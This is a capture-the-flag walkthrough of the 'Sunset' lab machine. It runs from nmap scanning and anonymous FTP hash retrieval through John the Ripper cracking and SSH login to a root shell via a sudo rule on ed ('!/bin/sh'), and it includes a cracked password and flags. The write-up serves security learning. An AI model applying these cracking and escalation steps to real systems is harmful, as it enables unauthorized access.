# Sunset — CTF Machine Walkthrough

## Overview

Sunset is a CTF-style vulnerable Linux machine run in an isolated lab environment. This document walks through the process of discovering the target, enumerating its services, gaining an initial foothold, and escalating privileges to root.

## Objective

Identify the target machine, enumerate open services, obtain valid credentials, gain shell access, and escalate privileges to root to retrieve the flags.

## Lab Environment

- Attacker machine: Kali Linux
- Target machine: Debian-based Linux (SSH banner identified it as Debian 10, kernel 4.19)
- Network: Local/isolated lab network (VirtualBox virtual NIC), target IP `10.0.2.13`

## Tools Used

- `arp-scan` — host discovery
- `nmap` — port scanning and service enumeration
- `ftp` — anonymous FTP access and file retrieval
- `John the Ripper` — password hash cracking
- `ssh` — remote shell access
- `sudo -l` — privilege enumeration
- GTFOBins — reference for `sudo`-based privilege escalation research

## 1. Target Discovery

To identify the target on the local network:

```
sudo arp-scan -l
```

This returned several hosts on the network, and the target machine was identified at:

```
10.0.2.13
```

## 2. Port Scanning & Enumeration

A full TCP port scan was run first to identify all open ports:

```
nmap -p- 10.0.2.13
```

This showed two open ports:

| Port | Service |
|---|---|
| 21 | FTP |
| 22 | SSH |

An aggressive scan was then run for deeper service/version detection:

```
nmap -A 10.0.2.13
```

Key findings:
- **FTP (21/tcp)** — `pyftpdlib 1.5.5`, with **anonymous login allowed** (FTP code 230). A world-readable file named `backup` (owned by root) was visible on the FTP server.
- **SSH (22/tcp)** — OpenSSH 7.9p1, Debian 10, protocol 2.0.

Since anonymous FTP login was enabled, that was the next avenue explored.

## 3. Anonymous FTP Access

Connected to the FTP service using the `anonymous` account:

```
ftp 10.0.2.13
```

Login succeeded with the `anonymous` username and a blank/email-style password (standard anonymous FTP behavior). Listing the directory showed a file named `backup`. It was downloaded with:

```
get backup
```

## 4. Backup File Analysis

Opening the downloaded file with `cat backup` revealed a set of hashed credentials for several usernames on the system (including entries for accounts such as `office`, `datacenter`, `sunset`, and `pace`), each stored as a salted SHA-512 crypt hash (`$6$...` format).

## 5. Password Hash / Credential Discovery

The relevant password hash was copied into a local file named `sun` for cracking.

## 6. Password Cracking

The hash was cracked using John the Ripper with the `rockyou.txt` wordlist:

```
john --wordlist=/usr/share/wordlists/rockyou.txt sun
john --show sun
```

This successfully cracked the hash, recovering the password for the `sunset` account.

> **Password:** hidden by default — see [Sensitive Data](#sensitive-data) below to reveal it.
>
> <details>
> <summary>Reveal cracked password</summary>
>
> `cheer14`
>
> </details>

## 7. SSH Access

Using the recovered credentials, SSH access was obtained:

```
ssh sunset@10.0.2.13
```

Login succeeded, dropping into a shell on the target as the `sunset` user (Debian GNU/Linux 4.19.0-5-amd64).

## 8. User Flag

Listing the home directory (`ls`) showed two files: `pass.txt` and `user.txt`. Reading the flag:

```
cat user.txt
```

> <details>
> <summary>Reveal user flag</summary>
>
> `5b5b8e9b01ef27a1cc0a2d5fa87d7190`
>
> </details>

`pass.txt` contained an additional password hash that was present in the lab notes but not cracked or used further in this walkthrough.

## 9. Privilege Escalation Enumeration

Checked what commands the `sunset` user could run with elevated privileges:

```
sudo -l
```

Output showed:

```
User sunset may run the following commands on sunset:
    (root) NOPASSWD: /usr/bin/ed
```

The `sunset` user could run the `ed` text editor as root, with no password required.

## 10. Privilege Escalation Research & Exploitation

`ed` was looked up on **GTFOBins**, which documents that if a binary is permitted to run as root via `sudo`, it does not drop elevated privileges — and `ed` specifically can be used to spawn a root shell via:

```
sudo ed
!/bin/sh
```

This was executed against the target and successfully returned a root shell, confirmed with:

```
whoami   # root
id       # uid=0(root) gid=0(root) groups=0(root)
```

Navigating to `/root` and listing its contents (`ls`) showed `flag.txt`, `ftp`, and `server.sh`. Reading the root flag:

```
cat flag.txt
```

> <details>
> <summary>Reveal root flag</summary>
>
> `25d7ce0ee3cbf71efbac61f85d0c14fe`
>
> </details>

## Attack Path Summary

1. Discovered target IP via `arp-scan`
2. Found open FTP (21) and SSH (22) via `nmap`
3. Identified anonymous FTP login was enabled
4. Downloaded a `backup` file exposing multiple password hashes
5. Cracked the `sunset` account hash with John the Ripper (`cheer14`)
6. Logged in over SSH as `sunset` and retrieved the user flag
7. Found a `NOPASSWD` sudo rule for `/usr/bin/ed`
8. Used the known GTFOBins technique for `ed` to spawn a root shell
9. Retrieved the root flag

## Key Lessons Learned

- Anonymous FTP access left a sensitive backup file — containing password hashes — publicly readable, which was the initial entry point into the whole chain.
- Weak, wordlist-crackable passwords (found via `rockyou.txt`) remain a realistic and common weakness.
- Overly permissive `sudo` rules for utilities like `ed` can be trivially abused for privilege escalation — GTFOBins is a valuable reference for recognizing these misconfigurations during enumeration.
- Privilege escalation enumeration (`sudo -l`) should be a routine step after gaining any foothold.

## Sensitive Data

Some values from this walkthrough (the cracked password and both flags) are collapsed above using `<details>` toggles rather than shown in plain text, out of courtesy to others who may still be working through this machine themselves, and to avoid publishing live-looking credential values by default. The methodology is fully visible either way.

## Disclaimer

This walkthrough was performed against an authorized CTF/lab machine in an isolated environment. It documents personal, entry-level learning and practice — it is not a demonstration of professional penetration-testing engagement experience.
